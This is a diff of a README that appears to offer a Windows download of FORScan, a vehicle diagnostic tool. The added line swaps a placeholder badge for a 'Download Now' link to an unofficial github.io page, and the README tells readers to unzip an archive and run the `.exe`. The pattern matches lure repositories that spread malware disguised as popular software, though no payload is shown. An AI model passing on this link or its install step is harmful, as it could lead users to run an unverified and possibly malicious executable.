@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install FORScan on your PC and connect your OBD2 adapter (ELM327 or OBDLink).  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://forscan-windows-download.github.io/.github/)
 
 ## 📸 Overview
 ![forscan-windows-dashboard](https://github.com/user-attachments/assets/d51a085b-3002-44e0-a3a4-739f4d22332c)
